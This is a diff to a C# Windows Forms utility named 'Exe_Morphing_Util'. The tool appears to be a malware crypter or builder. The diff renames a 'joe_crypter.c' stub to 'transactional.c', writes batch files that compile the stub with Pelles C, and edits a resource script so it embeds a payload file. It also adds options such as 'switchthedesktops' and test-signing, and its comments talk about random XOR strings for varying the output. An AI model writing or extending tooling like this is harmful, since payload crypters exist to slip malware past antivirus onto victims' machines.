@@ -711,6 +711,10 @@ namespace Exe_Morphing_Util
 
                 fs.Seek(2024, SeekOrigin.Begin);
 
+                if(cbSwitchDesktops.Checked)
+                {
+                    sw.WriteLine("switchthedesktops();");
+                }
 
                 if (cbTestSigning.Checked)
                 {
@@ -955,7 +959,10 @@ namespace Exe_Morphing_Util
                     break;
             }
 
-            
+            if (cbSwitchDesktops.Checked)
+            {
+                sw.WriteLine("switchthedesktops();");
+            }
 
             if (cbTestSigning.Checked)
             {
@@ -1142,12 +1149,13 @@ namespace Exe_Morphing_Util
         {
             // transactional file.c should be the same file. maybe i could add some random xor strings?
             // RtlInitUnicodeString(&ustr, L"fuck it"); // find and replace here random string between 8 and 20 chars
+            // compile only, no resource fuckery
 
             string compilerexe = "pocc.exe";
             string rsrcexe = "porc.exe";
             string linkexe = "polink.exe";
-            string sourcepath = Application.StartupPath + "\\builder\\joe_crypter.c";
-            string objpath = Application.StartupPath + "\\builder\\joe_crypter.obj";
+            string sourcepath = Application.StartupPath + "\\builder\\transactional.c";
+            string objpath = Application.StartupPath + "\\builder\\transactional.obj";
             // string payloadpath = Application.StartupPath + "\\builder\\res\\pload.joe";
             // see \builder\payload.rc, points to \\res\\payload.joe
             string rsrs1 = Application.StartupPath + "\\builder\\payload.rc";
@@ -1155,7 +1163,7 @@ namespace Exe_Morphing_Util
             string finalexe = Application.StartupPath + "\\builder\\transactional_exe.exe";
 
 
-            StreamWriter sw = new StreamWriter(Application.StartupPath + "\\builder\\buildit.bat");
+            StreamWriter sw = new StreamWriter(Application.StartupPath + "\\builder\\buildtrans.bat");
             sw.WriteLine("@echo off");
             sw.WriteLine("color 17");
             sw.WriteLine("set PellesCDir=" + Application.StartupPath + "\\compiler");
@@ -1190,7 +1198,7 @@ namespace Exe_Morphing_Util
 
             // run it
             System.Diagnostics.Process batfile = new System.Diagnostics.Process();
-            batfile.StartInfo.FileName = Application.StartupPath + "\\builder\\buildit.bat";
+            batfile.StartInfo.FileName = Application.StartupPath + "\\builder\\buildtrans.bat";
 
             //batfile.StartInfo.CreateNoWindow = true;
             //batfile.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
@@ -1221,6 +1229,10 @@ namespace Exe_Morphing_Util
             {
                 // set payload.res to include transactional.joe
                 // \\builder\\res\\transactional.joe
+                string text = File.ReadAllText(Application.StartupPath + "\\builder\\payload.rc");
+                text = text.Replace("//8002", "8002");
+                File.WriteAllText(Application.StartupPath + "\\builder\\payload.rc", text);
+
             }
             string rsrs1 = Application.StartupPath + "\\builder\\payload.rc";
             string rsrs2 = Application.StartupPath + "\\builder\\payload.res";
